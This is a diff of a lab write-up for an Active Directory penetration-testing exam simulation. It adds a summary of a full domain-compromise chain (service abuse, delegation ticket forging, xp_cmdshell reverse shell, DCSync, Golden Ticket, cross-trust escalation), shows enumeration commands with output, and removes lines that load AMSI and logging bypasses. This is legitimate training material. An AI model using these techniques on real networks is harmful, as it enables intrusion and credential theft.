@@ -26,7 +26,39 @@ By the conclusion of this report, the reader should understand both the **tactic
 
 ## Executive Summary
 
-???
+Below is a concise narrative of how the Active Directory environment was discovered, exploited, and ultimately fully compromised. This summary omits lower-impact details and focuses on the key steps that drove the attack forward.
+
+1. **Initial Recon and Limited Privileges**
+    - Began by enumerating the `tech.finance.corp` child domain and forest relationship, revealing a two-domain (child/parent) structure with a bidirectional trust to `finance.corp`.
+    - Identified relevant domain accounts, including `tech\sqlserversync` (with replication rights and SQL admin privileges on `dbserver31.tech.finance.corp`) and `tech\techservice` (actively logged on `mgmtsrv.tech.finance.corp`).
+    - Found no immediately exploitable SMB shares or local administrative privileges (as `tech\studentuser`) in the environment.
+2. **Local Privilege Escalation on `studvm.tech.finance.corp`**
+    - A misconfigured Windows service (`vds`) allowed modifying its binary path. By pointing it to `net localgroup Administrators tech\studentuser /add`, the attacker elevated to local admin on `studvm.tech.finance.corp`.
+3. **Constrained Delegation → Foothold on `mgmtsrv.tech.finance.corp`**
+    - Enumeration revealed Constrained Delegation for the computer account `tech\STUDVM$`, delegating to CIFS on `mgmtsrv.tech.finance.corp`.
+    - Forged an S4U ticket with `tech\STUDVM$`'s AES key, impersonating `Administrator`, and achieved remote administrative access on `mgmtsrv.tech.finance.corp`.
+4. **Further Credential Extraction and Persistence**
+    
+    - On **`mgmtsrv`**, extracted the **`tech\techservice`** credentials and the machine's Kerberos keys.
+    - Leveraged the **RC4 key** of `mgmtsrv` to craft a **Silver Ticket**, granting **persistent administrative** access to the server without contacting the Domain Controller.
+5. **Pivot to `techsrv30.tech.finance.corp`**
+    
+    - With **`tech\techservice`**'s AES key, performed an **OverPass-The-Hash** to obtain a TGT and connect to **`techsrv30`**.
+    - Extracted **`tech\databaseagent`** credentials and discovered it was a **sysadmin** on the SQL instance at **`dbserver31`**.
+6. **SQL `xp_cmdshell` → Lateral Movement onto `dbserver31`**
+    
+    - Abused the **SQL sysadmin** rights (`tech\databaseagent`) to run `xp_cmdshell` on **`dbserver31`**, spawning a **reverse shell** as **`tech\sqlserversync`**.
+    - Elevated to **SYSTEM** on `dbserver31` via **GodPotato** token impersonation and then extracted the **domain replication** credentials of `sqlserversync`.
+7. **DCSync and Domain Admin**
+    
+    - With `tech\sqlserversync`'s replication privileges, performed a **DCSync** attack to retrieve the **`tech\administrator`** and **`tech\krbtgt`** hashes and AES keys.
+    - Forged a **Golden Ticket** (using the `krbtgt` key) to gain **Domain Admin** privileges in **`tech.finance.corp`**.
+8. **Cross-Trust Attack to `finance.corp`**
+    
+    - Finally, abused the **child-domain `krbtgt`** encryption key to inject an **Enterprise Admin** SID and impersonate an EA across the **forest trust**.
+    - Obtained full administrative access on **`finance-dc.finance.corp`**, extracting more credentials and completing the **root domain** compromise.
+
+By the end of these steps, the entire forest was under attacker control. Key techniques included service misconfiguration abuse, Constrained Delegation forging, OverPass-The-Hash, SQL `xp_cmdshell` exploitation, token impersonation for local escalation, LSASS memory dumps and DCSync for domain credentials, and Golden Ticket/SID History forging to extend compromise into the root domain.
 
 ---
 
@@ -34,32 +66,13 @@ By the conclusion of this report, the reader should understand both the **tactic
 
 ### Domain Enumeration
 
+1) **Domain Enumeration on `tech.finance.corp`** (successful ✅)
+
+Description: Performed a comprehensive enumeration of the `tech.finance.corp` domain and its forest context, revealing a two-domain forest (`finance.corp` as root and `tech.finance.corp` as child) with a bidirectional trust. Enumerated domain users, computers, and groups, noting that the built-in `Administrator` accounts reside in both Domain Admins and Enterprise Admins groups. Discovered that `tech\sqlserversync` has replication-related ACL rights, is a SQL Administrator for `dbserver31.tech.finance.corp`, and maintains an active session on that server. `tech\techservice` also has a session running on `mgmtsrv.tech.finance.corp`. Attempted to find SMB shares and local admin access, from the perspective of the user `tech\studentuser`, but no immediate misconfigurations or accessible shares were found. Overall, these findings established the groundwork for subsequent misconfigurations abuse, lateral movement and privilege escalation steps.
+
+- 1.1) **Identify Domains, Forests, Trusts**
+
 ![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
-
-`whoami`:
-```
-tech\studentuser👤
-```
-
-`hostname`:
-```
-studvm🖥️
-```
-
-`ipconfig`:
-```
-Windows IP Configuration
-
-Ethernet adapter Ethernet:
-
-   Connection-specific DNS Suffix  . :
-   Link-local IPv6 Address . . . . . : fe80::dca5:8ad4:c3fa:8934%4
-   IPv4 Address. . . . . . . . . . . : 172.16.100.1🌐
-   Subnet Mask . . . . . . . . . . . : 255.255.255.0
-   Default Gateway . . . . . . . . . : 172.16.100.254
-```
-
-`cd C:\AD\Tools`
 
 `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
 ```
@@ -67,12 +80,6 @@ Ethernet adapter Ethernet:
 ```
 
 `Import-Module C:\AD\Tools\PowerView.ps1`
-
-#### Domain Enumeration | Domains, Forests, Trusts (with PowerView)
-
-**Domain Enumeration | Forests**
-
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `Get-Domain`:
 ```
@@ -104,10 +111,6 @@ SchemaRoleOwner       : finance-dc.finance.corp
 NamingRoleOwner       : finance-dc.finance.corp
 ```
 
-**Domain Enumeration | Domains**
-
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
-
 `Get-ForestDomain -Verbose`:
 ```
 Forest                  : finance.corp
@@ -133,10 +136,6 @@ InfrastructureRoleOwner : tech-dc.tech.finance.corp
 Name                    : tech.finance.corp🏛️
 ```
 
-**Domain Enumeration | Trusts**
-
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
-
 `Get-DomainTrust`:
 ```
 SourceName      : tech.finance.corp🏛️
@@ -158,50 +157,13 @@ WhenChanged     : 3/11/2025 8:53:24 AM
 | finance.corp | finance.corp       | -              | finance-dc.finance.corp          | -                                   |
 | finance.corp | tech.finance.corp  | finance.corp   | tech-dc.tech.finance.corp        | Bidirectional trust with finance.corp (WITHIN_FOREST) |
 
-#### Domain Enumeration | Users, Computers, Groups (with PowerView, BloodHound)
-
-**Domain Enumeration | Users**
+- 1.2) **Identify Domain Users, Computers, Groups**
 
 ![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
 tech\studentuser👤
-```
-
-`Get-DomainUser -Name 'studentuser'`:
-```
-logoncount            : 17
-badpasswordtime       : 12/31/1600 4:00:00 PM
-distinguishedname     : CN=student user,CN=Users,DC=tech,DC=finance,DC=corp
-objectclass           : {top, person, organizationalPerson, user}
-displayname           : student user
-lastlogontimestamp    : 3/11/2025 1:59:44 AM
-userprincipalname     : studentuser
-samaccountname        : studentuser👤
-codepage              : 0
-samaccounttype        : USER_OBJECT
-accountexpires        : NEVER
-countrycode           : 0
-whenchanged           : 3/11/2025 8:59:44 AM
-instancetype          : 4
-usncreated            : 20893
-objectguid            : f0a2b1ef-88bb-4463-8037-6d5f94c5cac3
-sn                    : user
-lastlogoff            : 12/31/1600 4:00:00 PM
-whencreated           : 2/3/2022 3:47:16 PM
-objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
-dscorepropagationdata : {2/4/2022 1:16:34 PM, 2/3/2022 3:47:16 PM, 1/1/1601 12:00:01 AM}
-givenname             : student
-usnchanged            : 65641
-lastlogon             : 3/11/2025 2:10:35 AM
-badpwdcount           : 0
-cn                    : student user
-useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
-objectsid             : S-1-5-21-1325336202-3661212667-302732393-1108
-primarygroupid        : 513
-pwdlastset            : 3/11/2025 1:59:37 AM
-name                  : student user
 ```
 
 `Get-DomainUser | select -ExpandProperty samaccountname`:
@@ -215,9 +177,10 @@ databaseagent👤
 sqlserversync👤
 ```
 
-**Domain Enumeration | Computers**
-
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+`hostname`:
+```
+studvm🖥️
+```
 
 `Get-DomainComputer | select -ExpandProperty samaccountname`:
 ```
@@ -230,11 +193,11 @@ DBSERVER31$🖥️
 
 `Get-DomainComputer | select -ExpandProperty dnshostname`:
 ```
-tech-dc.tech.finance.corp
-studvm.tech.finance.corp
-mgmtsrv.tech.finance.corp
-techsrv30.tech.finance.corp
-dbserver31.tech.finance.corp
+tech-dc.tech.finance.corp🖥️
+studvm.tech.finance.corp🖥️
+mgmtsrv.tech.finance.corp🖥️
+techsrv30.tech.finance.corp🖥️
+dbserver31.tech.finance.corp🖥️
 ```
 
 `notepad C:\AD\Tools\servers.txt`:
@@ -243,10 +206,6 @@ mgmtsrv.tech.finance.corp
 techsrv30.tech.finance.corp
 dbserver31.tech.finance.corp
 ```
-
-**Domain Enumeration | Groups**
-
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
 `Get-DomainGroupMember -Identity 'Domain Admins'`:
 ```
@@ -272,54 +231,13 @@ MemberObjectClass       : user
 MemberSID               : S-1-5-21-1712611810-3596029332-2671080496-500
 ```
 
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
-
-`cd /AD/Tools`
-
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
-
-`iex (type C:\AD\Tools\sbloggingbypass.txt)`
-
-`iex (type C:\AD\Tools\amsibypass.txt)`
-
-`Import-Module C:\AD\Tools\SharpHound.ps1`
-
-`Invoke-BloodHound -CollectionMethod All`:
-```
-2025-03-11T08:07:18.9902876-07:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
-2025-03-11T08:07:18.9902876-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-2025-03-11T08:07:19.0059188-07:00|INFORMATION|Initializing SharpHound at 8:07 AM on 3/11/2025
-2025-03-11T08:07:19.1310778-07:00|WARNING|Common Library is already initialized
-2025-03-11T08:07:19.1466851-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
-2025-03-11T08:07:19.1935793-07:00|INFORMATION|Beginning LDAP search for tech.finance.corp
-2025-03-11T08:07:19.2404237-07:00|INFORMATION|Producer has finished, closing LDAP channel
-2025-03-11T08:07:19.2404237-07:00|INFORMATION|LDAP channel closed, waiting for consumers
-2025-03-11T08:07:49.4776665-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 100 MB RAM
-2025-03-11T08:08:04.5208726-07:00|INFORMATION|Consumers finished, closing output channel
-2025-03-11T08:08:04.5833002-07:00|INFORMATION|Output channel closed, waiting for output task to complete
-Closing writers
-2025-03-11T08:08:04.6770770-07:00|INFORMATION|Status: 93 objects finished (+93 2.066667)/s -- Using 102 MB RAM
-2025-03-11T08:08:04.6770770-07:00|INFORMATION|Enumeration finished in 00:00:45.4891943
-2025-03-11T08:08:04.6926864-07:00|INFORMATION|Saving cache with stats: 58 ID to type mappings.
- 59 name to SID mappings.
- 1 machine sid mappings.
- 5 sid to domain mappings.
- 0 global catalog mappings.
-2025-03-11T08:08:04.6926864-07:00|INFORMATION|SharpHound Enumeration Completed at 8:08 AM on 3/11/2025! Happy Graphing!📌
-```
-
 ![BloodHound Legacy | Analysis - Find all Domain Admins](crtp_exam_simulation_bloodhound_find_all_domain_admins.png)
 
 ![BloodHound Legacy | Analysis - Find Shortest Paths to Domain Admins](crtp_exam_simulation_bloodhound_find_shortest_paths_domain_admins.png)
 
 ![BloodHound Legacy | Analysis - Find Principals with DCSync Rights](crtp_exam_simulation_bloodhound_find_principals_with_dcsync_rights.png)
 
-#### Domain Enumeration | ACLs, OUs, GPOs (with PowerView, BloodHound)
-
-**Domain Enumeration | ACLs**
+- 1.3) **Identify Domain ACLs, OUs, GPOs**
 
 ![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
@@ -365,24 +283,17 @@ IdentityReferenceDN     : CN=sqlserver sync,CN=Users,DC=tech,DC=finance,DC=corp
 IdentityReferenceClass  : user
 ```
 
-**Domain Enumeration | OUs**
-
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
-
 `Get-DomainOU | select -ExpandProperty name`:
 ```
-Domain Controllers🗂️
+[SNIP]
 ```
-
-**Domain Enumeration | GPOs**
-
-![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
+❌
 
 `Get-DomainGPO | select -ExpandProperty displayname`:
 ```
-Default Domain Policy📑
-Default Domain Controllers Policy📑
+[SNIP]
 ```
+❌
 
 ![BloodHound Legacy | Node Info: Applocker - Explicit Object Controllers](crtp_exam_simulation_bloodhound_node_info_explicit_object_controllers_01.png)
 
@@ -392,25 +303,11 @@ Default Domain Controllers Policy📑
 
 ![BloodHound Legacy | Node Info: DevOps Policy - Affected OUs](crtp_exam_simulation_bloodhound_node_info_affected_ous_02.png)
 
-#### Domain Enumeration | Shares, Local Admin Access, Session Hunting (with PowerHuntShares, Find-PSRemotingLocalAdminAccess, Invoke-SessionHunter, PowerView)
-
-**Domain Enumeration | Shares**
+- 1.4) **Attempt to Discovery Domain Shares**
 
 ![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
-
 `Import-Module C:\AD\Tools\PowerHuntShares.psm1`
-
-`type C:\AD\Tools\servers.txt`:
-```
-mgmtsrv.tech.finance.corp
-techsrv30.tech.finance.corp
-dbserver31.tech.finance.corp
-```
 
 `Invoke-HuntSMBShares -NoPing -OutputDirectory C:\AD\Tools\ -HostList C:\AD\Tools\servers.txt`:
 ```
@@ -433,53 +330,25 @@ dbserver31.tech.finance.corp
 [SNIP]
 ```
 
-`dir C:\AD\Tools\SmbShareHunt-02202025063120`:
-```
-    Directory: C:\AD\Tools\SmbShareHunt-03112025134124
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
-d-----        3/11/2025   1:42 PM                Results
--a----        3/11/2025   1:42 PM         971698 Summary-Report-SmbHunt.html📌
-```
-
 [SCREENSHOT]
 ❌
 
-**Domain Enumeration | Local Admin Access**
+- 1.5) **Identify Local Admin Access**
 
 ![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
-
 `Import-Module C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1`
 
-`Find-PSRemotingLocalAdminAccess -Domain tech.finance.corp`:
+`Find-PSRemotingLocalAdminAccess -Domain 'tech.finance.corp'`:
 ```
 ```
 ❌
 
-**Domain Enumeration | Session Hunting with Invoke-SessionHunter**
+- 1.6) **Identify Domain Active Sessions**
 
 ![studvm | studentuser $>](https://custom-icon-badges.demolab.com/badge/studvm-studentuser%20[%24>]-64b5f6?logo=windows11&logoColor=white)
 
-`C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`:
-```
-[SNIP]
-```
-
 `Import-Module C:\AD\Tools\Invoke-SessionHunter.ps1`
-
-`type C:\AD\Tools\servers.txt`:
-```
-mgmtsrv.tech.finance.corp
-techsrv30.tech.finance.corp
-dbserver31.tech.finance.corp
-```
 
 `Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access`:
 ```
